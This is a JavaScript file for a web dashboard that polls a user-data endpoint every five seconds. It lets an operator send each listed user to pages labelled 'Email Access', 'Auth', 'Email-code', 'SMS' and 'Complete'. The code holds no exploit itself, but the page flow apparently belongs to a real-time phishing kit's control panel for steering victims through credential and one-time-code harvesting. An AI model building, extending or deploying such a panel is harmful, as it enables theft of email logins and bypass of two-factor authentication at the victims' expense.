function showSection(sectionId) {
    const sections = document.querySelectorAll('.section');
    sections.forEach(section => {
        section.style.display = 'none';
    });
    document.getElementById(sectionId).style.display = 'block';

    const buttons = document.querySelectorAll('.sidebar button');
    buttons.forEach(button => {
        button.classList.remove('active');
    });
    document.getElementById(sectionId + 'Btn').classList.add('active');
}


document.addEventListener('DOMContentLoaded', () => {
    showSection('dashboard');
});

function showDetails(title, ...details) {
    document.getElementById('popupTitle').innerText = title;
    document.getElementById('popupContent').innerText = details.join('\n');
    document.getElementById('overlay').style.display = 'block';
    document.getElementById('popup').style.display = 'block';
}

function hideDetails() {
    document.getElementById('overlay').style.display = 'none';
    document.getElementById('popup').style.display = 'none';
}

function showAction(id, codeButtonDisabled) {
    const actionContent = `
        <form method='post' action='update_user_page.php' onsubmit='return validateForm()'>
            <select name='page' id='pageSelect' onchange='checkSelection()'>
                <option value='' disabled selected>Select Page</option>
                ${codeButtonDisabled ? '' : '<option value="previous">Previous</option>'}
                <option value='email'>Email Access</option>
                <option value='auth'>Auth</option>
                <option value='alert'>Alert</option>
                <option value='email_code'>Email-code</option>
                <option value='sms'>SMS</option>
                <option value='complete'>Complete</option>
            </select>
            <input type='hidden' name='id' value='${id}'>
            <input type='submit' id='submitButton' value='Submit'>
        </form>
    `;
    document.getElementById('actionContent').innerHTML = actionContent;
    document.getElementById('actionOverlay').style.display = 'block';
    document.getElementById('actionPopup').style.display = 'block';
}

function hideAction() {
    document.getElementById('actionOverlay').style.display = 'none';
    document.getElementById('actionPopup').style.display = 'none';
}

function checkSelection() {
    const selectElement = document.getElementById('pageSelect');
    const submitButton = document.getElementById('submitButton');
    if (selectElement.value === "") {
        submitButton.disabled = true;
    } else {
        submitButton.disabled = false;
    }
}

function validateForm() {
    const selectElement = document.getElementById('pageSelect');
    if (selectElement.value === "") {
        alert("Please select a page.");
        return false;
    }
    return true;
}


document.addEventListener('DOMContentLoaded', () => {
    const submitButton = document.getElementById('submitButton');
    if (submitButton) {
        submitButton.disabled = true;
    }
});

function fetchDashboardData() {
    fetch('fetch_user_data.php')
        .then(response => response.text())
        .then(data => {
            document.getElementById('dashboardTableBody').innerHTML = data;
        })
        .catch(error => console.error('Error fetching dashboard data:', error));
}


setInterval(fetchDashboardData, 5000);


document.addEventListener('DOMContentLoaded', fetchDashboardData);

document.addEventListener('DOMContentLoaded', () => {
    const messageElement = document.getElementById('message');
    if (messageElement) {
        setTimeout(() => {
            messageElement.style.display = 'none';
        }, 3000);
    }
});

